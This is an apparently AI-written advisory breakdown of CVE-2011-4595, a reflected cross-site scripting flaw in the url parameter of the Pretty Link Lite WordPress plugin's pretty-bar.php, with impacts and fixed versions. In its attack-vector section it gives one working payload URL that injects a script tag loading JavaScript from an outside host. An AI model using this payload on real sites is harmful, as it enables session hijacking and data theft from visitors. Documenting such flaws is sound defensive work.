Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2011-4595

**Root Cause of Vulnerability:**
- The root cause is the lack of proper input validation in the `pretty-bar.php` file of the "Pretty Link Lite" WordPress plugin. Specifically, the `url` parameter is vulnerable to Cross-Site Scripting (XSS).

**Weaknesses/Vulnerabilities Present:**
- **Cross-Site Scripting (XSS):** The plugin is vulnerable to XSS because it does not sanitize or validate the input received through the `url` parameter in `pretty-bar.php` file. This allows an attacker to inject malicious scripts into the web page.

**Impact of Exploitation:**
- **Arbitrary Script Execution:** An attacker can inject malicious JavaScript code which will be executed in the victim's browser. This can lead to:
    - **Session Hijacking:** Stealing user session cookies.
    - **Defacement:** Altering the appearance of the webpage.
    - **Redirection:** Redirecting users to malicious websites.
    - **Malware Distribution:**  Forcing the download of malware.
    - **Data theft:** Accessing sensitive user data.
    - **Other malicious actions:** Any actions that can be achieved with javascript.

**Attack Vectors:**
- The attack vector is through the `pretty-bar.php` file.
- An attacker can craft a malicious URL with a script injected in the `url` parameter. For example:  `wp-content/plugins/pretty-link/pretty-bar.php?url=”><SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>`.
- The victim needs to visit this crafted malicious URL to trigger the XSS.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to craft a malicious URL.
- The attacker doesn't need to be authenticated.
- The attacker needs to trick or entice a user of the vulnerable wordpress site into clicking the crafted URL.

**Additional details:**
- The vulnerability was present in Pretty Link Lite version 1.5.2.
- The vulnerability was fixed in versions 1.5.4 (verified) and 1.5.6.
- The `pretty-bar.php` file was not intended to be directly accessible by users. The recommended fix was either to prevent direct execution of the file by users or to implement proper user input validation.
